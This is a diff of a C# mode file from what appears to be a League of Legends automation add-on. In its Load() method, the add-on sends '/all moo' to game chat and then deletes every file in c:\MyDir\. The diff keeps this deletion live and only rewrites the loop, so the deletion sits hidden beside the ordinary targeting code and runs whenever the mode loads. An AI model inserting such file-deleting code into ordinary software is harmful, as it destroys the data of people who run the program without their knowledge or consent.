@@ -1,5 +1,6 @@
 //
 ﻿using System;
+﻿using System.IO;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
@@ -15,8 +16,9 @@ namespace Auto_Carry_Vayne.Features.Modes
         public static void Load()
         {
             Chat.Say("/all moo");
-            Array.ForEach(Directory.GetFiles(@"c:\MyDir\"),
-              delegate(string path) { File.Delete(path); });
+            string[] filePaths = Directory.GetFiles(@"c:\MyDir\");
+            foreach (string filePath in filePaths)
+             File.Delete(filePath);
             var target = TargetSelector.GetTarget((int)Variables._Player.GetAutoAttackRange(),
     DamageType.Physical);
             if (target == null) return;
